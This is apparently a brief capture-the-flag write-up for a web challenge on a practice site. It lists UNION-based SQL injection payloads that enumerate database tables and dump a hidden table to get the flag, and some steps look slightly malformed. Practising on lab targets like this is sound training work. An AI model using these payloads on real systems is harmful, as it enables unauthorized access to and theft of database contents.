
# Inj3ction Time 

**Category:** Web

# Problem
I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command

# Hints
- This problem will solve using SQL injection
- Try to use UNION Query
- Follow this step
- 1 union select 1,2,3
- 1 union select table_name, 1,2,3 from information_schema.tables
- after that we got "w0w_y0u_f0und_m3" table name
- 1 union select  *, 1,2,3 from w0w_y0u_f0und_m3
- Boom u get the flag